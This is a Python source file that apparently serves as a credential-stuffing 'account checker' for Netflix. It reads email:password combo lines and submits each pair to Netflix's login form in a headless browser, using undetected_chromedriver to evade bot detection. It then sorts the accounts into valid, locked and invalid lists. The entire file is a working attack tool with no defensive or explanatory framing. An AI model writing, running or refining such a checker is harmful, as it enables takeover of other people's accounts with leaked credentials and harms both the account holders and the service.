
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as uc
import time

def check_accounts(combos):
    valid, invalid, locked = [], [], []

    for combo in combos:
        email, password = combo.split(":", 1)
        result = check_login(email.strip(), password.strip())
        if result == "valid":
            valid.append(combo)
        elif result == "locked":
            locked.append(combo)
        else:
            invalid.append(combo)

    return {"valid": valid, "invalid": invalid, "locked": locked}

def check_login(email, password):
    options = uc.ChromeOptions()
    options.headless = True
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")

    try:
        driver = uc.Chrome(options=options)
        driver.get("https://www.netflix.com/login")
        time.sleep(2)

        driver.find_element(By.NAME, "userLoginId").send_keys(email)
        driver.find_element(By.NAME, "password").send_keys(password)
        driver.find_element(By.CLASS_NAME, "btn.login-button").click()
        time.sleep(3)

        if "browse" in driver.current_url:
            driver.quit()
            return "valid"
        elif "LoginHelp" in driver.page_source:
            driver.quit()
            return "locked"
        else:
            driver.quit()
            return "invalid"
    except Exception as e:
        print("Error:", e)
        return "invalid"
